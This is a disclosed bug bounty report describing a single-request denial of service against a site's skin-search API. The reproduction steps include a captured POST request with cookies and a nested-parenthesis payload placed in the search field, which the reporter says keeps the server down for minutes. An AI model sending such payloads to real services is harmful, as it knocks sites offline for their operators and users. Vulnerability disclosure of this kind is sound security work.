# Application DOS via specially crafted payload on 3d.cs.money

## Report Details
- **Report ID**: 993582
- **URL**: https://hackerone.com/reports/993582
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-28T18:28:49.678Z
- **Disclosed**: 2020-10-01T11:46:38.782Z

## Reporter
- **Username**: enigmaticjohn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: cs_money

## Vulnerability Information
## Summary:
Hello Team,
While testing it was observed that on **3d.cs.money** a DOS is possible via specially crafted request using only single request from single machine on search bar.
Though I am aware of the Out of Scope policy "Any activity that could lead to the disruption of our service (DoS)", this scenario is different, here we are only using one Request and depending on the payload, the DOS time can be varied.

## Steps To Reproduce:

  1. Go to https://3d.cs.money/item/default
  2. Turn ON the intercept and type something in search box.
  3. A POST request will be captured as follows:

```
POST /api/skin/search HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 32
Origin: https://3d.cs.money
Connection: close
Referer: https://3d.cs.money/item/default
Cookie: __cfduid=d38bfad20d6ec52ba0a6af9014d27a2e81601313370; TEST_GROUP=2; UUID3D=to4nZuWnRSS4A7G; _ga=GA1.1.214308118.1601313374; _ga_HY7CCPCD7H=GS1.1.1601313373.1.1.1601316641.57; _gid=GA1.2.24460124.1601313377

{"name":"[Payload here]","item_name":"AK-47"}
```
  4. Send it to the Repeater.
  5. Put the following payload at [Payload here]
```(((((()0)))))```

  6. This will take down the host for few minutes.
  7. If we add more parenthesis like ```((((((()0))))))``` , the site will be down for more time.

## Supporting Material/References:
PFA screenshot.

## Impact

Web server can be made inaccessible for any amount of time using only single request.

## Attachments
- host_site.jpeg
